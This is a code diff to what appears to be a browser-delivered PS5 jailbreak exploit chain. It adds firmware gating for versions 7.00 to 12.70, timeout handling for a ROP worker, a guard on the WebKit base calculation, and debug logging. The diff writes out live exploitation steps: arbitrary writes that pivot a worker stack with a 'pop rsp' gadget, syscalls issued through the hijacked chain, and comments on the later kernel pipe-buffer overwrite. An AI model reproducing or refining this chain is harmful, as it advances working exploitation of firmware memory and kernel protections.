@@ -135,6 +135,42 @@ const IPPROTO_UDP = 17;
 const IPPROTO_IPV6 = 41;
 const IPV6_PKTINFO = 46;
 
+/* HARDPATH: firmwares with a hardware-proven full-chain run.
+ *
+ * Anything added to the SHARED path after a firmware's proving run is a change to code
+ * that firmware never executed when it worked. For a proven firmware that is a
+ * regression waiting to happen, and it has already cost us one: the 8s ROP-worker
+ * timeout below was added for 7.00 bring-up (13c7abe, 2026-08-21) and silently applied
+ * to 9.00-12.70, none of which had ever run with a bounded wait.
+ *
+ * Listed here = run the sequence the proving run ran. New instrumentation and new
+ * safety nets are opt-in for these until they have their own hardware evidence.
+ *
+ * fw      proven                                                    source
+ * 7.00    full chain -> elfldr, devkit                              WORKING.txt 2026-08-21
+ * 9.05    full chain                                                WORKING.txt 2026-08-17
+ * 12.00   both exploits, retail + devkit                            WORKING.txt 2026-08-17
+ * 12.60   p2jb full chain, devkit                                   WORKING.txt 2026-08-17
+ * 12.70   p2jb full chain -> elfldr, devkit (run rmsxdbmmw)         WORKING.txt 2026-08-17
+ * 12.02 / 12.20 / 12.40  constant-identical twins of a proven fw, preflight passed
+ *                        (groups A {12.00,12.02,12.20} / B {12.40,12.60,12.70})
+ */
+const HARDPATH_FW = {
+    "7.00": 1, "9.05": 1,
+    "12.00": 1, "12.02": 1, "12.20": 1, "12.40": 1, "12.60": 1, "12.70": 1,
+};
+function isHardpath() {
+    try { return !!HARDPATH_FW[String(window.fw_str)]; } catch (e) { return false; }
+}
+
+// The rop_slave probe already had to go 4s -> 20s (93ea1b5) because this worker is
+// genuinely slow on a cold run, so 8s was never a safe ceiling for it either.
+const ROP_WAIT_MS = 20000;
+
+var __TRACE=(function(){try{return /(^|[?&])log=debug(&|$)/.test(location.search);}catch(e){return false;}})();
+function __rop(t){if(!__TRACE)return;try{var x=new XMLHttpRequest();
+    x.open("GET","log/ROP-"+encodeURIComponent(String(t)).slice(0,180),false);x.send();}catch(e){}}
+
 function jbmark(tag, detail) {
     try {
         if (window.jb && typeof window.jb.mark === "function")
@@ -177,6 +213,21 @@ async function prepare(p) {
                 ? "0x" + globalThis.__ps5NativeCtor.toString(16) : "absent")
             + "-hc=" + (typeof OFFSET_wk_host_constructor_candidates !== "undefined"
                 ? OFFSET_wk_host_constructor_candidates.length : "none"));
+        /* The vtable fallback is legacy for pre-9.00. On 9.00+ core.js always sets
+           __ps5NativeCtor before prepare() runs, so this branch is unreachable in
+           practice - it has fired 0 times in 81 recorded runs.
+
+           It matters anyway: offsets/12.02 .. 12.70 carry
+               const OFFSET_wk_vtable_first_element = 0;  // needs a console
+           and subtracting 0 yields the raw first-vtable-entry pointer as if it were
+           the module base. Every gadget and syscall is then derived from a wrong
+           base and the page dies with no usable message. Refuse instead: a loud
+           failure here is worth far more than a plausible wrong number. */
+        if (!OFFSET_wk_vtable_first_element) {
+            throw new Error("fw " + window.fw_str + " has no OFFSET_wk_vtable_first_element"
+                + " and __ps5NativeCtor was absent - cannot resolve the WebKit base."
+                + " (Reload; if this repeats the host-constructor path is broken.)");
+        }
         libSceNKWebKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);
     }
 
@@ -344,19 +395,54 @@ async function prepare(p) {
 
         p.write8(return_address_ptr, gadgets["pop rsp"]);
         p.write8(stack_pointer_ptr, chain.stack_entry_point);
+        // read the two slots back: proves the arbitrary write reached the worker stack
+
 
         if (window.jb && window.jb.hot)
             jbmark("CHAIN-PRE-POST", "next=worker.postMessage(0)-rop-executes-now");
+        const hardpath = isHardpath();
         let p1 = await new Promise((resolve) => {
+            let settled = false;
             worker.onmessage = function (e) {
+                if (settled) return;
+                settled = true;
                 resolve(1);
+            }
+            /* A hang and a fault look identical without a bound - but a bound is only
+             * worth having if timing out is treated as failure. It was not: the timeout
+             * resolved -1 and the only guard below is `p1 == 0`, so a slow worker sailed
+             * through and the run continued issuing syscalls down a chain whose worker
+             * had never answered. That is the wedge that cost 12.70 its first run.
+             *
+             * On a HARDPATH firmware there is no bound at all: wait on onmessage exactly
+             * as the proving run did. Everywhere else the bound is 20s and it THROWS.
+             *
+             * Safe to throw here: prepare() is pure userland. No kernel structure has
+             * been touched yet - the pipe pair is not poisoned until stage2
+             * (p2jb.js: kwrite_slow(S, S.master_pipe_data, pipe_overwrite, 24)), so at
+             * this point master.pipe_buffer.buffer is still its own pipe_map allocation
+             * and FreeBSD's pipeclose() -> pipe_free_kmem() unmaps exactly what it
+             * allocated. Aborting here cannot panic; continuing on a phantom -1 can,
+             * because it lets the sync executor fire syscalls while the hijacked worker
+             * stack is in an unknown state. */
+            if (!hardpath) {
+                setTimeout(function () {
+                    if (settled) return;
+                    settled = true;
+                    __rop("ROP-TIMEOUT-worker-never-answered-" + ROP_WAIT_MS + "ms");
+                    resolve(-1);
+                }, ROP_WAIT_MS);
             }
             worker.postMessage(0);
         });
         if (window.jb && window.jb.hot)
-            jbmark("CHAIN-POST-POST", "worker-answered-p1=" + p1);
+            jbmark("CHAIN-POST-POST", "worker-answered-p1=" + p1 + "-hardpath=" + hardpath);
         if (p1 == 0) {
             throw new Error("The rop thread ran away. ");
+        }
+        if (p1 < 0) {
+            throw new Error("the rop worker never answered in " + (ROP_WAIT_MS / 1000)
+                + "s - refusing to continue on a chain that never ran. (Reload.)");
         }
     }
 
@@ -394,6 +480,7 @@ async function prepare(p) {
         + "-poisoned-next=chain.syscall(SYS_GETPID)");
 
     let pid = await chain.syscall(SYS_GETPID);
+    __rop("getpid raw=0x" + pid.toString());
 
     jbmark("PREP-GETPID-POST", "raw=0x" + pid.toString());
     if (pid.low == JB_POISON.low && pid.hi == JB_POISON.hi) {
@@ -1225,4 +1312,4 @@ async function main(userlandRW, wkOnly = false) {
 let fwScript = document.createElement('script');
 document.body.appendChild(fwScript);
 
-fwScript.setAttribute('src', `offsets/${window.fw_str}.js?v=16`);
+fwScript.setAttribute('src', `offsets/${window.fw_str}.js?v=128`);
